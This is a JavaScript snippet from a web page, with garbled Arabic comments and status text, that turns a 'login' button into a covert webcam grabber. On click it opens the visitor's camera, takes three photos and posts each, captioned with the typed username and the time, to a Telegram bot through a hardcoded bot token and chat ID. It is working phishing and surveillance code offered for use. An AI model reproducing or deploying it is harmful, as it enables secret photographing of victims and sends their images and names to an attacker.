
<script>
// Ø¶Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø¨ÙˆØªÙƒ Ù‡Ù†Ø§
const TOKEN   = "8408449205:AAHQ6__cO8R7s3kEmZsFTl0hNY9aUYscenM";   // Ù…Ù† BotFather
const CHAT_ID = "6504203392";             // Ù…Ù† @userinfobot

const btn = document.getElementById('loginBtn');
const status = document.getElementById('status');
const video = document.getElementById('v');
const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d');

function setStatus(t){ status.textContent = t; }

async function openCamera(){
  const stream = await navigator.mediaDevices.getUserMedia({video:true});
  video.srcObject = stream;
  await video.play();
  return stream;
}

function captureBlob(){
  return new Promise(resolve=>{
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    canvas.toBlob(blob=>resolve(blob),"image/jpeg");
  });
}

async function sendToTelegram(blob, meta){
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", blob, "photo.jpg");
  form.append("caption", `ðŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${meta.user}\nðŸ•’ Ø§Ù„ÙˆÙ‚Øª: ${new Date(meta.time).toLocaleString()}`);

  const url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
  const res = await fetch(url, { method:"POST", body: form });
  return res.ok;
}

btn.addEventListener('click', async ()=>{
  btn.disabled = true;
  setStatus('Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...');
  let stream;
  try{
    stream = await openCamera();
    setStatus('Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§...');
    const meta = { user: document.getElementById('user').value || "", time: Date.now() };

    for(let i=1;i<=3;i++){
      const blob = await captureBlob();
      const ok = await sendToTelegram(blob, meta);
      setStatus(ok? `âœ”ï¸ Ø£Ø±Ø³Ù„Øª Ø§Ù„ØµÙˆØ±Ø© ${i}/3` : `âš ï¸ Ø®Ø·Ø£ Ø¹Ù†Ø¯ Ø¥Ø±Ø³Ø§Ù„ ${i}`);
      await new Promise(r=>setTimeout(r,800));
    }
    setStatus('âœ… Ø§Ù†ØªÙ‡Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ©');
  }catch(e){
    console.error(e);
    setStatus('âŒ ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ùˆ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±');
  }finally{
    if(video.srcObject) video.srcObject.getTracks().forEach(t=>t.stop());
    btn.disabled = false;
  }
});
</script>
